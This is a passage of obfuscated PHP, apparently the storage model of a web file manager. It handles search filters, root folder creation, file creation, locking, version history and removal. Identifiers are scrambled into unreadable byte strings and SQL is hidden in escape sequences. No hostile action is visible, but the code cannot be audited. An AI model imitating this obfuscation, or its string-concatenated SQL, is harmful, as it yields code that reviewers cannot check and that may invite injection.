$–·±ºëÀ[431]); $¯•ş¹õö = array_merge($¯•ş¹õö, array_to_keyvalue($ğóâ£¬, $–·±ºëÀ[12], $–·±ºëÀ[431])); if (!$ù‡ĞŞš²) { return $¯•ş¹õö; } $ÈØ«æå¾ = array($–·±ºëÀ[461] => array($–·±ºëÀ[7], $ù‡ĞŞš²)); $ğóâ£¬ = $this->field($–·±ºëÀ[2130])->where($ÈØ«æå¾)->limit($µœ›ı—µ)->select(); $¯•ş¹õö = array_merge($¯•ş¹õö, array_to_keyvalue($ğóâ£¬, $–·±ºëÀ[12], $–·±ºëÀ[431])); $¯•ş¹õö = array_slice($¯•ş¹õö, 0, $µœ›ı—µ); return $¯•ş¹õö; } private function _listSearchBindPinyin($–ı·éĞ­, &$Ÿ®ğğ›ë, &$¯ñ¢“ê) { $ê“è†Û¥ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($–ı·éĞ­[$ê“è†Û¥[1960]]) || !$–ı·éĞ­[$ê“è†Û¥[1960]]) { return; } if (!Input::check($–ı·éĞ­[$ê“è†Û¥[1960]], $ê“è†Û¥[347]) || strlen($–ı·éĞ­[$ê“è†Û¥[1960]]) < 2) { return; } $„”‰Ğå¸ = "\x4c\105\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\151\x6f\137\x73\x6f\165\162\143\x65\137\155\145\164\x61\40\x6d\145\164\x61\40\157\x6e\x20\x73\x6f\x75\162\x63\145\x2e\163\157\x75\x72\x63\145\x49\104\40\x3d\40\155\x65\x74\141\x2e\163\x6f\x75\162\143\145\x49\104"; $‘çè„Ëƒ = array(); $¯ñ¢“ê = str_replace(array($ê“è†Û¥[231], $ê“è†Û¥[53], $ê“è†Û¥[2131]), $ê“è†Û¥[12], $¯ñ¢“ê); $¯ñ¢“ê = $ê“è†Û¥[467] . str_replace($ê“è†Û¥[50], $ê“è†Û¥[468], $¯ñ¢“ê); $šŞÂ¸¶ = $Ÿ®ğğ›ë[$ê“è†Û¥[32]]; unset($Ÿ®ğğ›ë[$ê“è†Û¥[32]]); foreach ($Ÿ®ğğ›ë as $ãğßËŞ£ => $éòĞá•Û) { $‘çè„Ëƒ[$ê“è†Û¥[467] . $ãğßËŞ£] = $éòĞá•Û; } foreach ($šŞÂ¸¶ as $ÔÅ÷‚ ª) { $‘çè„Ëƒ[] = array($ê“è†Û¥[472] => $ÔÅ÷‚ ª, $ê“è†Û¥[1033] => $ê“è†Û¥[1964], array($ê“è†Û¥[2132] => $ÔÅ÷‚ ª, $ê“è†Û¥[2133] => array($ê“è†Û¥[7], array($ê“è†Û¥[494], $ê“è†Û¥[493])))); } $this->join($„”‰Ğå¸); $Ÿ®ğğ›ë = $‘çè„Ëƒ; } private function _parseSearchWhere($úÑıíœµ) { $éÇ»½‡ó =& $_SERVER[¹ş¤¶ĞÖ]; $÷µãŠé = array(); if (isset($úÑıíœµ[$éÇ»½‡ó[786]]) && $úÑıíœµ[$éÇ»½‡ó[786]]) { $÷µãŠé[$éÇ»½‡ó[85]] = array($éÇ»½‡ó[2134], $úÑıíœµ[$éÇ»½‡ó[786]]); } if (isset($úÑıíœµ[$éÇ»½‡ó[787]]) && $úÑıíœµ[$éÇ»½‡ó[787]]) { $£¯¢½áò = array($éÇ»½‡ó[2135], $úÑıíœµ[$éÇ»½‡ó[787]]); if ($÷µãŠé[$éÇ»½‡ó[85]]) { $÷µãŠé[$éÇ»½‡ó[85]] = array($÷µãŠé[$éÇ»½‡ó[85]], $£¯¢½áò, $éÇ»½‡ó[2136]); } else { $÷µãŠé[$éÇ»½‡ó[85]] = $£¯¢½áò; } } if (isset($úÑıíœµ[$éÇ»½‡ó[2128]]) && $úÑıíœµ[$éÇ»½‡ó[2128]] > 0) { $÷µãŠé[$éÇ»½‡ó[76]] = array($éÇ»½‡ó[2134], $úÑıíœµ[$éÇ»½‡ó[2128]]); } if (isset($úÑıíœµ[$éÇ»½‡ó[2129]]) && $úÑıíœµ[$éÇ»½‡ó[2129]]) { $£¯¢½áò = array($éÇ»½‡ó[2135], $úÑıíœµ[$éÇ»½‡ó[2129]]); if ($÷µãŠé[$éÇ»½‡ó[76]]) { $÷µãŠé[$éÇ»½‡ó[76]] = array($÷µãŠé[$éÇ»½‡ó[76]], $£¯¢½áò, $éÇ»½‡ó[2136]); } else { $÷µãŠé[$éÇ»½‡ó[76]] = $£¯¢½áò; } } if (isset($úÑıíœµ[$éÇ»½‡ó[619]]) && $úÑıíœµ[$éÇ»½‡ó[619]]) { $÷µãŠé[] = array($éÇ»½‡ó[485] => $úÑıíœµ[$éÇ»½‡ó[619]], $éÇ»½‡ó[483] => $úÑıíœµ[$éÇ»½‡ó[619]], $éÇ»½‡ó[1033] => $éÇ»½‡ó[1964]); } if (isset($úÑıíœµ[$éÇ»½‡ó[441]]) && $úÑıíœµ[$éÇ»½‡ó[441]]) { $ˆÙçğç™ = $úÑıíœµ[$éÇ»½‡ó[441]]; if ($ˆÙçğç™ == $éÇ»½‡ó[75]) { $÷µãŠé[$éÇ»½‡ó[439]] = 1; } else { if ($ˆÙçğç™ == $éÇ»½‡ó[2137]) { $÷µãŠé[$éÇ»½‡ó[439]] = 0; } else { if ($ˆÙçğç™) { $ˆÙçğç™ = is_array($ˆÙçğç™) ? $ˆÙçğç™ : explode($éÇ»½‡ó[50], $ˆÙçğç™); $÷µãŠé[$éÇ»½‡ó[441]] = array($éÇ»½‡ó[447], $ˆÙçğç™); $÷µãŠé[$éÇ»½‡ó[439]] = 0; } } } } $this->_parseSearchParent($úÑıíœµ, $÷µãŠé); if (isset($úÑıíœµ[$éÇ»½‡ó[1960]]) && trim($úÑıíœµ[$éÇ»½‡ó[1960]])) { $ÁúÚŸÙ§ = trim($úÑıíœµ[$éÇ»½‡ó[1960]]); $™Â¢èôñ = explode($éÇ»½‡ó[53], $ÁúÚŸÙ§); if (strlen($ÁúÚŸÙ§) > 2 && (substr($ÁúÚŸÙ§, 0, 1) == $éÇ»½‡ó[118] && substr($ÁúÚŸÙ§, -1) == $éÇ»½‡ó[118]) || substr($ÁúÚŸÙ§, 0, 1) == $éÇ»½‡ó[58] && substr($ÁúÚŸÙ§, -1) == $éÇ»½‡ó[58]) { $ÁúÚŸÙ§ = substr($ÁúÚŸÙ§, 1, -1); $™Â¢èôñ = array($ÁúÚŸÙ§); } $÷µãŠé[$éÇ»½‡ó[32]] = array(array($éÇ»½‡ó[569], $éÇ»½‡ó[1962] . $ÁúÚŸÙ§ . $éÇ»½‡ó[1962])); if (count($™Â¢èôñ) > 1) { $÷µãŠé[$éÇ»½‡ó[32]] = array(); foreach ($™Â¢èôñ as $êÓ‚´÷õ) { if (!trim($êÓ‚´÷õ)) { continue; } $÷µãŠé[$éÇ»½‡ó[32]][] = array($éÇ»½‡ó[569], $éÇ»½‡ó[1962] . trim($êÓ‚´÷õ) . $éÇ»½‡ó[1962]); } } } return $÷µãŠé; } private function _parseSearchParent($Ü¿°ö°, &$³Íü‘µ) { $âÜè¢û³ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($Ü¿°ö°[$âÜè¢û³[461]]) || !$Ü¿°ö°[$âÜè¢û³[461]]) { return; } $Ô½Ú÷Ìò = $this->pathInfo($Ü¿°ö°[$âÜè¢û³[461]]); $±Ó°Ö = $Ô½Ú÷Ìò[$âÜè¢û³[461]] . $âÜè¢û³[12] === $âÜè¢û³[198]; $‘é§ø·¨ = $Ô½Ú÷Ìò[$âÜè¢û³[440]] == $âÜè¢û³[534]; if ($Ô½Ú÷Ìò[$âÜè¢û³[551]] == $âÜè¢û³[552]) { $ı»ı±– = $this->sourceInfo($Ü¿°ö°[$âÜè¢û³[461]]); $Ô½Ú÷Ìò[$âÜè¢û³[540]] = $ı»ı±–[$âÜè¢û³[540]]; } $³Íü‘µ[$âÜè¢û³[609]] = array($âÜè¢û³[569], $Ô½Ú÷Ìò[$âÜè¢û³[540]] . $Ü¿°ö°[$âÜè¢û³[461]] . $âÜè¢û³[570]); $‰÷Î = isset($Ü¿°ö°[$âÜè¢û³[1825]]) && in_array($âÜè¢û³[534], $Ü¿°ö°[$âÜè¢û³[1825]]); if (!$‰÷Î || !$‘é§ø·¨ || !$±Ó°Ö || !$Ô½Ú÷Ìò[$âÜè¢û³[442]]) { return; } if (!AuthModel::authCheckRoot($Ô½Ú÷Ìò[$âÜè¢û³[442]][$âÜè¢û³[443]])) { return; } $ìöŒäî = $Ô½Ú÷Ìò[$âÜè¢û³[525]] . $âÜè¢û³[12]; if ($ìöŒäî == $âÜè¢û³[88]) { unset($³Íü‘µ[$âÜè¢û³[609]]); $³Íü‘µ[$âÜè¢û³[440]] = self::TYPE_GROUP; return; } $ŒØ†À¥… = Model($âÜè¢û³[541])->groupChildrenAll($ìöŒäî); $ıû„ô“Œ = count($ŒØ†À¥…); if ($ıû„ô“Œ <= 1) { return; } $ïåøèÜ£ = array($âÜè¢û³[461] => 0, $âÜè¢û³[440] => self::TYPE_GROUP, $âÜè¢û³[525] => array($âÜè¢û³[7], $ŒØ†À¥…)); $°çùêŠ = $this->field($âÜè¢û³[2138])->where($ïåøèÜ£)->limit($ıû„ô“Œ)->select(); $³Íü‘µ[$âÜè¢û³[609]] = array(); foreach ($°çùêŠ as $š§µÑæ) { $³Íü‘µ[$âÜè¢û³[609]][] = array($âÜè¢û³[569], $âÜè¢û³[550] . $š§µÑæ[$âÜè¢û³[431]] . $âÜè¢û³[570]); } $³Íü‘µ[$âÜè¢û³[609]][] = $âÜè¢û³[1964]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¨©ÔÊ›¯) { $¨¢òÈ”İ =& $_SERVER[¹ş¤¶ĞÖ]; $¹ÛŸ÷èÓ = Model($¨¢òÈ”İ[533])->where(array($¨¢òÈ”İ[1667] => $¨©ÔÊ›¯))->find(); $µ¦©Õ¤ß = $this->_mkdirRoot(SourceModel::TYPE_USER, $¨©ÔÊ›¯, $¹ÛŸ÷èÓ[$¨¢òÈ”İ[32]]); $this->userDesktopAdd($µ¦©Õ¤ß); return $µ¦©Õ¤ß; } public function userDesktopAdd($‘Ô„ÈèŞ) { $ª»“³İÓ =& $_SERVER[¹ş¤¶ĞÖ]; $””˜ßå” = LNG($ª»“³İÓ[2139]); $×ãç¥¢ = $this->mkdir($‘Ô„ÈèŞ, $””˜ßå”); $this->metaSet($×ãç¥¢, $ª»“³İÓ[2140], $ª»“³İÓ[88]); $this->metaSet($‘Ô„ÈèŞ, $ª»“³İÓ[2141], $×ãç¥¢); } public function userPathSafeAdd($£ãéÇİÙ) { $§Ï—ÍÀ =& $_SERVER[¹ş¤¶ĞÖ]; $Ä´«óŠË = Model($§Ï—ÍÀ[533])->getInfoFull($£ãéÇİÙ); if (!$Ä´«óŠË) { return !1; } if (_get($Ä´«óŠË, $§Ï—ÍÀ[555])) { return $Ä´«óŠË[$§Ï—ÍÀ[495]][$§Ï—ÍÀ[2142]]; } $°ŠËÏ® = $this->_mkdirRoot(SourceModel::TYPE_USER, $£ãéÇİÙ, $§Ï—ÍÀ[2143], $§Ï—ÍÀ[462]); Model($§Ï—ÍÀ[533])->metaSet($£ãéÇİÙ, $§Ï—ÍÀ[2142], $°ŠËÏ®); $this->metaSet($°ŠËÏ®, $§Ï—ÍÀ[2144], $£ãéÇİÙ); return $°ŠËÏ®; } public function groupRootAdd($¢ı‡óÑà) { $£áÃÉ =& $_SERVER[¹ş¤¶ĞÖ]; $È×—ªû = Model($£áÃÉ[541])->where(array($£áÃÉ[1954] => $¢ı‡óÑà))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¢ı‡óÑà, $È×—ªû[$£áÃÉ[32]]); } public function systemRootPathAdd($‡Û±ñ¼À) { if ($‡Û±ñ¼À != $_SERVER[¹ş¤¶ĞÖ][563]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‡Û±ñ¼À); } public function userRootRemove($˜ùè…·Ø) { $ËŒü­«¡ = $this->targetSourceRoot(SourceModel::TYPE_USER, $˜ùè…·Ø, !0); foreach ($ËŒü­«¡ as $Ü¿ÔÍÓŞ) { if (!$Ü¿ÔÍÓŞ) { continue; } $this->remove($Ü¿ÔÍÓŞ[$_SERVER[¹ş¤¶ĞÖ][431]], !1); } } public function groupRootRemove($³ˆü¬ôÇ) { $äñ¨Ú¾ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $³ˆü¬ôÇ); if (!$äñ¨Ú¾) { return; } $this->remove($äñ¨Ú¾[$_SERVER[¹ş¤¶ĞÖ][431]], !1); } private function _mkdirRoot($¾”™¨ÅÓ, $ƒ“¿¹¸õ, $«¾î¸Ò, $û·˜áû¢ = '') { $×Óıûñ =& $_SERVER[¹ş¤¶ĞÖ]; $®ûòü’ = defined($×Óıûñ[2087]) ? USER_ID : 0; $ŞÍàòÑ¾ = array($×Óıûñ[430] => 0, $×Óıûñ[605] => $¾”™¨ÅÓ, $×Óıûñ[606] => $ƒ“¿¹¸õ, $×Óıûñ[603] => 1, $×Óıûñ[607] => $®ûòü’, $×Óıûñ[608] => $®ûòü’, $×Óıûñ[604] => $û·˜áû¢, $×Óıûñ[609] => $×Óıûñ[550], $×Óıûñ[459] => 0, $×Óıûñ[574] => 0, $×Óıûñ[498] => 0, $×Óıûñ[610] => $×Óıûñ[12]); if ($´ğİæ€Ÿ = $this->where($ŞÍàòÑ¾)->find()) { return $´ğİæ€Ÿ[$×Óıûñ[431]]; } $óæ³’É = "\115\157\x64\145\154\x53\157\x75\162\143\x65\56\x6d\x6b\x64\x69\x72\122\157\157\x74\x2e{$¾”™¨ÅÓ}\56{$ƒ“¿¹¸õ}\56" . $«¾î¸Ò; CacheLock::lock($óæ³’É); $ŞÍàòÑ¾[$×Óıûñ[32]] = $«¾î¸Ò; $Â³¼¸Ò­ = $this->add($ŞÍàòÑ¾); $Üö›£íº = array($×Óıûñ[611] => short_id($Â³¼¸Ò­)); $this->where(array($×Óıûñ[446] => $Â³¼¸Ò­))->save($Üö›£íº); CacheLock::unlock($óæ³’É); return $Â³¼¸Ò­; } private function targetSourceRoot($öÇæ¨šÙ, $ÁÕ÷Ÿº­, $’ıñÙã¤ = false) { $İ‘§ñóÀ =& $_SERVER[¹ş¤¶ĞÖ]; $öúûìÔ« = array($İ‘§ñóÀ[430] => 0, $İ‘§ñóÀ[605] => $öÇæ¨šÙ, $İ‘§ñóÀ[606] => $ÁÕ÷Ÿº­); if ($’ıñÙã¤) { $²±•Õ„á = $this->where($öúûìÔ«)->select(); return $²±•Õ„á ? $²±•Õ„á : array(); } $°’®ÎÈñ = $this->where($öúûìÔ«)->find(); return $°’®ÎÈñ ? $°’®ÎÈñ : array(); } public function sourceRootGroup($ÍŸÃòÉŠ) { $ÄÍ¼ïÏ =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($ÍŸÃòÉŠ)) { $ÍŸÃòÉŠ = array($ÍŸÃòÉŠ); } $½÷„°Ã = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÍŸÃòÉŠ, $ÄÍ¼ïÏ[189]); $óïˆÙ®‘ = array($ÄÍ¼ïÏ[398] => $½÷„°Ã, $ÄÍ¼ïÏ[395] => array($ÄÍ¼ïÏ[784] => count($ÍŸÃòÉŠ))); $this->_listDataApply($óïˆÙ®‘[$ÄÍ¼ïÏ[398]]); $this->_listMake($óïˆÙ®‘); return array_to_keyvalue($óïˆÙ®‘[$ÄÍ¼ïÏ[82]], $ÄÍ¼ïÏ[525]); } public function mkfile($ú•²Ó˜, $˜ıßˆ, $Âàº ëç = '', $ÀíÇâ¤ = REPEAT_RENAME) { $°û³¸Æá =& $_SERVER[¹ş¤¶ĞÖ]; $ÉÕ¿Š‚Ÿ = Model($°û³¸Æá[630])->addFileByContent($Âàº ëç, $˜ıßˆ); return $this->_createFileCall($ú•²Ó˜, $˜ıßˆ, $ÉÕ¿Š‚Ÿ, $ÀíÇâ¤, $°û³¸Æá[1377]); } public function addFile($Åà’üäš, $áØğ¹Ç§, $ô½ˆÈ¸, $€şÑÏŞÈ = false, $¦Ò§ÜÛ = REPEAT_RENAME) { $ûµ÷“Àİ = Model($_SERVER[¹ş¤¶ĞÖ][630])->addFile($áØğ¹Ç§, $ô½ˆÈ¸, $€şÑÏŞÈ); return $this->_createFileCall($Åà’üäš, $ô½ˆÈ¸, $ûµ÷“Àİ, $¦Ò§ÜÛ); } public function addFileByFileID($íĞ¯İÄï, $‹‡âãº, $øœÜ‰œ, $İ‚§Úº = REPEAT_RENAME) { $Ñ„¶Ü€ =& $_SERVER[¹ş¤¶ĞÖ]; $ªâì´¤ø = Model($Ñ„¶Ü€[630])->find($‹‡âãº); Model($Ñ„¶Ü€[630])->linkAdd($‹‡âãº); return $this->_createFileCall($íĞ¯İÄï, $øœÜ‰œ, $ªâì´¤ø, $İ‚§Úº); } public function addFileByRemote($…‡îŞ­ï, $ë´éôš, $øø±úŒŠ, $ş¯¢‘¢æ = array(), $ï±Öà· = REPEAT_RENAME) { $‘Ú¦êïØ = Model($_SERVER[¹ş¤¶ĞÖ][630])->addFileByRemote($ë´éôš, $øø±úŒŠ, $ş¯¢‘¢æ); return $this->_createFileCall($…‡îŞ­ï, $øø±úŒŠ, $‘Ú¦êïØ, $ï±Öà·); } private function _createFileCall($¬“îú´», $ö‰ŠÔ¿ş, $¡º¢ˆ¯×, $´ôÄµ¾ü, $ÙÆşçı = "\x75\160\154\x6f\141\144") { $ÓØô÷Ş¥ =& $_SERVER[¹ş¤¶ĞÖ]; $Ûï‡ØŒĞ = !1; $this->setMasterDB(); $this->lockWriteStart($¬“îú´», $ö‰ŠÔ¿ş); $üåö´² = $this->fileNameExist($¬“îú´», $ö‰ŠÔ¿ş); $íœ‹Çëó = $this->_createFile($¬“îú´», $ö‰ŠÔ¿ş, $¡º¢ˆ¯×, $´ôÄµ¾ü, $Ûï‡ØŒĞ); if (!$Ûï‡ØŒĞ) { Model($ÓØô÷Ş¥[500])->remove($¡º¢ˆ¯×[$ÓØô÷Ş¥[497]]); } if ($Ûï‡ØŒĞ && $íœ‹Çëó && $íœ‹Çëó != $üåö´²) { Model($ÓØô÷Ş¥[2112])->eventCreate($íœ‹Çëó, $ÙÆşçı); } $this->lockWriteEnd($¬“îú´», $ö‰ŠÔ¿ş); return $íœ‹Çëó; } public function mkdir($³Ò‡‘Ã–, $¼Í¯ÅÃà, $ªøŸ¢‹¡ = REPEAT_SKIP) { $éüè‚ÍÑ =& $_SERVER[¹ş¤¶ĞÖ]; $this->setMasterDB(); $·ç½Ø«Õ = $this->sourceInfo($³Ò‡‘Ã–); if (!$·ç½Ø«Õ) { return !1; } $this->lockWriteStart($³Ò‡‘Ã–, $¼Í¯ÅÃà); if ($ªøŸ¢‹¡ !== !1) { $ûŠ’ÚÆ = $this->fileNameExist($³Ò‡‘Ã–, $¼Í¯ÅÃà); if ($ûŠ’ÚÆ && $ªøŸ¢‹¡ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($³Ò‡‘Ã–, $¼Í¯ÅÃà); return $ûŠ’ÚÆ; } $¼Í¯ÅÃà = $this->fileNameAuto($³Ò‡‘Ã–, $¼Í¯ÅÃà, $ªøŸ¢‹¡); } $ú°·ˆ» = array($éüè‚ÍÑ[603] => 1, $éüè‚ÍÑ[449] => $¼Í¯ÅÃà, $éüè‚ÍÑ[604] => $éüè‚ÍÑ[12], $éüè‚ÍÑ[498] => 0, $éüè‚ÍÑ[574] => 0); $ÈÄÀà¾† = $this->_addSource($ú°·ˆ», $·ç½Ø«Õ); Model($éüè‚ÍÑ[2112])->eventCreate($ÈÄÀà¾†, $éüè‚ÍÑ[1378]); $this->lockWriteEnd($³Ò‡‘Ã–, $¼Í¯ÅÃà); return $ÈÄÀà¾†; } public function listSourceRoot($ò©×“î×, $¸ã•ÄÍ, $‡ƒû¦ãÌ = "\163\157\x75\162\x63\x65\111\104\x2c\164\x61\x72\x67\x65\164\x49\104\54\163\151\172\x65") { $æ¾¥™¤– =& $_SERVER[¹ş¤¶ĞÖ]; $ì‚à¨Õ¦ = $æ¾¥™¤–[407]; $£ºÖ™Í = array(); $—ÊìãÂó = 1024 * 50; $…Ì€Š¶ = is_array($…Ì€Š¶) ? $…Ì€Š¶ : array(); $¥ïõŠ†ˆ = count($¸ã•ÄÍ); $Â¶Ã”¬ = $this->tablePrefix . $æ¾¥™¤–[2145]; for ($ïãŞùŠû = 0; $ïãŞùŠû < $¥ïõŠ†ˆ; $ïãŞùŠû++) { $•ÓÑúËç = $¸ã•ÄÍ[$ïãŞùŠû]; $ì‚à¨Õ¦ .= "\123\105\114\x45\x43\124\x20\x2a\40\x46\122\117\115\x20\50\x53\x45\114\105\103\x54\x20{$‡ƒû¦ãÌ}\40\x46\122\x4f\x4d\x20\x60{$Â¶Ã”¬}\x60\x20\x57\x48\x45\122\105\40"; $ì‚à¨Õ¦ .= "\x60\x70\141\x72\x65\x6e\164\111\104\140\75\60\x20\101\x4e\104\40\140\x74\x61\x72\147\145\164\x49\104\140\x3d{$•ÓÑúËç}\40\x41\x4e\x44\x20\140\164\141\162\147\x65\x74\124\x79\160\x65\x60\x3d{$ò©×“î×}\40\141\x6e\x64\40\146\x69\154\145\124\171\x70\x65\75\47\x27\40\154\x69\x6d\151\x74\40\x31\x29\40\x61\x73\40\164\x62\x5f{$ïãŞùŠû}\x20\x55\116\111\117\x4e\x20\x41\114\x4c\40"; if ((strlen($ì‚à¨Õ¦) >= $—ÊìãÂó || $ïãŞùŠû == $¥ïõŠ†ˆ - 1) && $ì‚à¨Õ¦) { $ì‚à¨Õ¦ = substr($ì‚à¨Õ¦, 0, -strlen($æ¾¥™¤–[1071])); $õÌœì€ = $this->query($ì‚à¨Õ¦); $ì‚à¨Õ¦ = $æ¾¥™¤–[12]; $£ºÖ™Í = array_merge($£ºÖ™Í, $õÌœì€); } } return $£ºÖ™Í; } private function _createFile($½Š¤Şä, $Â˜ÂşºÊ, $èç§•”, $Š§û–„É, &$®ŞÇ£„Ù) { $ÏÕ“¹†û =& $_SERVER[¹ş¤¶ĞÖ]; $Ü°—±Ş‘ = $this->sourceInfo($½Š¤Şä); if (!$èç§•” || !$Ü°—±Ş‘) { return !1; } if ($Š§û–„É !== !1) { $÷›‹÷”Ú = $this->fileNameExist($½Š¤Şä, $Â˜ÂşºÊ); } $®ŞÇ£„Ù = !0; if ($Š§û–„É && $÷›‹÷”Ú) { if ($Š§û–„É == REPEAT_SKIP) { $®ŞÇ£„Ù = !1; return $÷›‹÷”Ú; } else { if ($Š§û–„É == REPEAT_REPLACE) { $óÉ‰•Ñ¯ = $this->sourceInfo($÷›‹÷”Ú); $¶º†Óä = $this->fileHistory($óÉ‰•Ñ¯, $èç§•”[$ÏÕ“¹†û[497]], $èç§•”[$ÏÕ“¹†û[76]]); if (!$¶º†Óä) { $®ŞÇ£„Ù = !1; } else { $this->folderSizeReset($½Š¤Şä); } return $÷›‹÷”Ú; } else { $Â˜ÂşºÊ = $this->fileNameAuto($½Š¤Şä, $Â˜ÂşºÊ, $Š§û–„É, !1); } } } $‹ÕøôÏÖ = array($ÏÕ“¹†û[603] => 0, $ÏÕ“¹†û[449] => $Â˜ÂşºÊ, $ÏÕ“¹†û[604] => substr(get_path_ext($Â˜ÂşºÊ), 0, 10), $ÏÕ“¹†û[498] => $èç§•”[$ÏÕ“¹†û[497]], $ÏÕ“¹†û[574] => $èç§•”[$ÏÕ“¹†û[76]]); $õş¦¬şá = $this->_addSource($‹ÕøôÏÖ, $Ü°—±Ş‘); $this->folderSizeReset($½Š¤Şä, intval($‹ÕøôÏÖ[$ÏÕ“¹†û[76]])); return $õş¦¬şá; } protected function fileHistory($šéÂŠµ¾, $Ñ´®şš, $ùƒ¸çŞ) { $Ñ¨ôì›ê =& $_SERVER[¹ş¤¶ĞÖ]; if ($šéÂŠµ¾[$Ñ¨ôì›ê[497]] == $Ñ´®şš) { return !1; } $this->checkLock($šéÂŠµ¾[$Ñ¨ôì›ê[431]], $Ñ´®şš); Model($Ñ¨ôì›ê[2146])->addHistory($šéÂŠµ¾); $¡¨î¯¿Û = array($Ñ¨ôì›ê[608] => USER_ID, $Ñ¨ôì›ê[453] => time(), $Ñ¨ôì›ê[497] => $Ñ´®şš, $Ñ¨ôì›ê[76] => $ùƒ¸çŞ); $this->where(array($Ñ¨ôì›ê[446] => $šéÂŠµ¾[$Ñ¨ôì›ê[431]]))->save($¡¨î¯¿Û); $this->sourceCacheClear($šéÂŠµ¾[$Ñ¨ôì›ê[431]]); return !0; } public function checkLock($ÓÂŸÙıÒ, $íş°«) { $¦ışÊ„Å =& $_SERVER[¹ş¤¶ĞÖ]; $Ûá¡üî = $this->pathInfo($ÓÂŸÙıÒ); if (!$this->fileIsLock($Ûá¡üî, !0)) { return; } $§¿ßÑıû = Session::get($¦ışÊ„Å[2147]); $ªîïõÍã = substr($Ûá¡üî[$¦ışÊ„Å[32]], 0, -1 - strlen($Ûá¡üî[$¦ışÊ„Å[174]])) . $¦ışÊ„Å[1241] . $§¿ßÑıû . $¦ışÊ„Å[10] . $Ûá¡üî[$¦ışÊ„Å[174]]; $ÌñÁ…­Ü = Model($¦ışÊ„Å[630])->find($íş°«); $this->_createFileCall($Ûá¡üî[$¦ışÊ„Å[461]], $ªîïõÍã, $ÌñÁ…­Ü, REPEAT_REPLACE, $¦ışÊ„Å[1377]); $ÅÙ»Òûı = $Ûá¡üî[$¦ışÊ„Å[495]][$¦ışÊ„Å[567]]; $ùüï·Á¸ = $ÅÙ»Òûı[$¦ışÊ„Å[561]] ? $ÅÙ»Òûı[$¦ışÊ„Å[561]] : $ÅÙ»Òûı[$¦ışÊ„Å[32]]; show_json(LNG($¦ışÊ„Å[2148]) . $¦ışÊ„Å[2149] . LNG($¦ışÊ„Å[2150]) . $¦ışÊ„Å[2151] . $ùüï·Á¸ . $¦ışÊ„Å[2152], !1); } public function fileIsLock($íş†êÀÄ, $³¢¿û”— = false) { $ÓÊö”¦ë =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($íş†êÀÄ[$ÓÊö”¦ë[495]]) || !$íş†êÀÄ[$ÓÊö”¦ë[495]][$ÓÊö”¦ë[564]]) { return !1; } if ($íş†êÀÄ[$ÓÊö”¦ë[495]][$ÓÊö”¦ë[564]] != USER_ID) { return !0; } $Š®Ñ³Úö = $GLOBALS[$ÓÊö”¦ë[6]][$ÓÊö”¦ë[89]][$ÓÊö”¦ë[565]]; if ($íş†êÀÄ[$ÓÊö”¦ë[495]][$ÓÊö”¦ë[566]] <= time() - $Š®Ñ³Úö) { $this->metaSet($íş†êÀÄ[$ÓÊö”¦ë[431]], $ÓÊö”¦ë[564], null); $this->metaSet($íş†êÀÄ[$ÓÊö”¦ë[431]], $ÓÊö”¦ë[566], null); } if ($³¢¿û”—) { $this->metaSet($íş†êÀÄ[$ÓÊö”¦ë[431]], $ÓÊö”¦ë[566], time()); } return !1; } private function _addSource($Šì•ÀÒ, $±µÎÄ„”) { $İıÃ³şÀ =& $_SERVER[¹ş¤¶ĞÖ]; $¾à³ÉŒœ = defined($İıÃ³şÀ[2087]) ? USER_ID : 0; $ã–ŸãĞÖ = array($İıÃ³şÀ[605] => $±µÎÄ„”[$İıÃ³şÀ[440]], $İıÃ³şÀ[606] => $±µÎÄ„”[$İıÃ³şÀ[525]], $İıÃ³şÀ[607] => $¾à³ÉŒœ, $İıÃ³şÀ[608] => $¾à³ÉŒœ, $İıÃ³şÀ[430] => $±µÎÄ„”[$İıÃ³şÀ[431]], $İıÃ³şÀ[609] => $±µÎÄ„”[$İıÃ³şÀ[540]] . $±µÎÄ„”[$İıÃ³şÀ[431]] . $İıÃ³şÀ[50], $İıÃ³şÀ[459] => 0, $İıÃ³şÀ[610] => $İıÃ³şÀ[12]); $Šì•ÀÒ = array_merge($ã–ŸãĞÖ, $Šì•ÀÒ); $this->updateModifyTime($Šì•ÀÒ[$İıÃ³şÀ[461]]); $‚ø¯³¥ö = $İıÃ³şÀ[2153] . $±µÎÄ„”[$İıÃ³şÀ[431]]; if (isset(self::$cacheChildList[$‚ø¯³¥ö])) { unset(self::$cacheChildList[$‚ø¯³¥ö]); } static $»ÛèŞ‚Ì = false; if (!$»ÛèŞ‚Ì) { Hook::trigger($İıÃ³şÀ[593], $Šì•ÀÒ); $»ÛèŞ‚Ì = !0; } $øÙÙñ»½ = $this->add($Šì•ÀÒ); $ Ïá´õÙ = array($İıÃ³şÀ[611] => short_id($øÙÙñ»½)); $this->where(array($İıÃ³şÀ[446] => $øÙÙñ»½))->save($ Ïá´õÙ); $this->setNamePinyin($øÙÙñ»½, $Šì•ÀÒ[$İıÃ³şÀ[32]]); return $øÙÙñ»½; } public function remove($åÜ¥ÁÏì, $…•é÷·– = true) { $Ô°ç«´ =& $_SERVER[¹ş¤¶ĞÖ]; $ûºÏÎ¾ï = $this->sourceInfo($åÜ¥ÁÏì); $Ì„×ÆÑ¶ = intval($ûºÏÎ¾ï[$Ô°ç«´[440]]) === self::TYPE_SYSTEM; $—‹³ †ñ = Model($Ô°ç«´[464])->get($Ô°ç«´[2154]) == $Ô°ç«´[88]; if ($Ì„×ÆÑ¶ || $…•é÷·– || !$—‹³ †ñ) { return $this->removeNow($åÜ¥ÁÏì, $…•é÷·–); } $é €áÊ· = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ŞÂš³Óõ = $ûºÏÎ¾ï[$Ô°ç«´[440]] == self::TYPE_USER ? $Ô°ç«´[619] : $Ô°ç«´[534]; if ($ŞÂš³Óõ == $Ô°ç«´[619]) { $éÒîé°ë = Model($Ô°ç«´[533])->getInfo($ûºÏÎ¾ï[$Ô°ç«´[525]]); $¸çª÷Æ = 